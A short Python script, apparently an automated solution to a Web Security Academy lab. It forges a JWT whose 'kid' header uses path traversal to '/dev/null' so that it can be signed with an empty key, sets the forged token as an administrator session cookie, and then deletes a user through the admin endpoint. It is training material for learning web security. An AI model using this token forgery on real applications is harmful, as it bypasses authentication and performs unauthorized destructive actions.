from web_security_academy.core.logger import logger
import jwt


def solve_lab(session):
    session.login("wiener", "peter")
    token = session.cookies.get("session")
    algorithm = jwt.get_unverified_header(token)["alg"]
    logger.info(f"Extracted JWT and determined algorithm: {algorithm}")

    payload = {"sub": "administrator"}
    headers = {"kid": "../../../dev/null"}
    token = jwt.encode(payload, "", algorithm=algorithm, headers=headers)
    session.cookies.clear_session_cookies()
    session.cookies.set("session", token)

    logger.info("Encoded the following payload as a JWT (includes KID path traversal):")
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
